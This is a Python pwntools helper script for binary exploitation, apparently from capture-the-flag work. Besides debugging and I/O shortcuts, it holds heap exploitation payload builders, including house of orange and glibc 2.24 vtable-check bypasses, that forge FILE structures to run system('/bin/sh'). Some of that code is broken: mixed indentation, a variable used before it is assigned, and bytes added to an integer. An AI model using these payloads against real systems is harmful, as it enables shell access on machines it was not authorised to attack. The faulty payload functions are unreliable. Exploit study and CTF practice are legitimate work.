#!/usr/bin/env python
# encoding: utf-8

from pwn import *
import os
from optparse import OptionParser






def lg(s,addr):
    """
    use red color show addr
    usage: s - > text ,addr -> whant to show 
    """
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))


def raddr(a=6):
    """
    do infoleak
    recvn() -- > to  read addr
    usage: size of addr
    """
    if(a==6):
        return u64(rv(a).ljust(8,'\x00'))
    else:
        return u64(rl().strip('\n').ljust(8,'\x00'))

def get_base_addr(pid):
    """
    get base :
    usage :PID Number
    """
    pid = int(pid)
    vmmap = os.popen("pmap %d | awk '{print $1}'"%(pid)).read()
    ba = vmmap.split("\n")[1]
    return int(ba,16)



def init_debug(io,breakpint=[],pie = False):
    """
    init debug
    usage: io, breakpoint ,pie if open
    return breakpoint and get gdb attach PID
    """
    if pie:
        base_addr = get_base_addr(proc.pidof(io)[0])
        bp = ''.join(['b *0x%x\n'%(b+base_addr) for b in breakpint])
    else:
        bp = ''.join(['b *0x%x\n'% b for b in breakpint])

    gdb.attach(proc.pidof(io)[0],bp)
    return bp



def init_parser():
    """
    init parser
    debug or remote
    """
    usage = "usage: %prog [options] arg"
    parser = OptionParser(usage=usage)

    parser.add_option("-l", "--local", dest="local", action="store_true",
                      help="pwn for local bin", default=False)
    parser.add_option("-r", "--remote", dest="remote",  action="store_true",
                      help="pwn for remote bin", default=False)

    (options, args) = parser.parse_args()

    if options.local:
        options.local = True
        options.remote = False
    elif options.remote:
        options.local = False
        options.remote = True
    else:
        options.local = True
        options.remote =  False
    return options


opt = init_parser()


def init_pwn(BIN_FILE = '',LIBC_FILE='',remote_detail=('127.0.0.1',23333),is_env = False):
    """
    init pwn infomation
    usage: binary ,libc.so ,remote ip and port and  if use libc to debug
    
    return io,elf,libc
    """
    global io
    elf = ELF(BIN_FILE)
    
#    if LIBC_FILE:
#        libc = ELF(LIBC_FILE)
#    else:
#        libc = elf.libc
    # io = process(binary,env = {'LD_PRELOAD': './libc.so.6'})
    env = {'LD_PRELOAD':os.getcwd() + '/' +  LIBC_FILE}
    if opt.local:
        if is_env:
            io = process(BIN_FILE,env=env)
            libc = ELF(LIBC_FILE)
        else:
            io = process(BIN_FILE)
            libc = elf.libc
    else:
        io = remote(remote_detail[0],remote_detail[1],timeout=5)
        libc = ELF(LIBC_FILE)

    return io,elf,libc

# coded by w1tcher
def house_of_orange(head_addr, system_addr, io_list_all):
    payload = b'/bin/sh\x00'
    payload = payload + p64(97) + p64(0) + p64(io_list_all - 16)
    payload = payload + p64(0) + p64(1) + p64(0) * 9 + p64(system_addr) + p64(0
        ) * 4
    payload = payload + p64(head_addr + 18 * 8) + p64(2) + p64(3) + p64(0
        ) + p64(18446744073709551615) + p64(0) * 2 + p64(head_addr + 12 * 8)
    return payload


def VtableCheckBypass(vtable_addr, system_addr, binsh_addr, io_list_all_addr):
    """
    _IO_str_overflow conditions

    houseoforange glibc.2.24 bypass vtablecheck

    vtable_addr is _IO_str_overflow addr (libc 2.24: 0x3BE058)
    """
	payload = p64(0) + p64(0x61) + p64(0) + p64(io_list_all_addr - 0x10)
	payload += p64(0) + p64((binsh_addr - 100) / 2 + 1) + p64(0) + p64(0) + p64((binsh_addr - 100) / 2) + p64(0) * 6 + p64(0) + p64(0) * 4
	payload += p64(0) + p64(2) + p64(3) + p64(0) + p64(0xffffffffffffffff) + p64(0) * 2 + p64(vtable_addr - 0x18) + p64(system_addr)
	return payload

def VtableCheckBypass_2(vtable_addr,heap_addr,system_addr,binsh_addr,io_list_all_addr):
    """
    _IO_str_finish conditions
    
    houseoforange glibc.2.24 bypass vtablecheck

    vtable_addr is _IO_str_finish addr (libc 2.24: 0x3BE050)

    """
    payload += p64((binsh_addr+0x10) & ~1) + p64(0x61)
    payload += p64(0) + p64(io_list_all_addr-0x10)
    payload += p64(0) + p64(1)
    payload += p64(0) + p64(binsh_addr)
    payload += p64(0) * 12
    payload += p64(0) + p64(0) + p64(0) + p64(0) + p64(0)
    payload += p64(0) * 2
    payload += p64(vtable_addr-0x18)
    payload = payload.ljust(0xe8,'\x00') + p64(system_addr)
    payload += p64(payload+0x660)

    return payload

def get_main_arena(libc_file):
    """
    if libc arch is amd64-64

    libc_file is libc path
    return main_arean_offset
    """
    mallocHook = int(os.popen('objdump -j .data -d '+ str(libc_file)+'| grep "__malloc_hook" |cut -d" " -f 1').read(),16)
    reallocHook = int(os.popen('objdump -j .data -d '+ str(libc_file)+'| grep "__realloc_hook"|cut -d" " -f 1').read(),16)


    offset = mallocHook-reallocHook
    main_arean_offset = hex(mallocHook + offset*2)
    
    log.success('main_arean_offset: {}'.format(main_arean_offset))
    return main_arean_offset


ru = lambda x : io.recvuntil(x)
sn = lambda x : io.send(x)
rl = lambda : io.recvline()
sl = lambda x : io.sendline(x)
rv = lambda x : io.recv(x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)
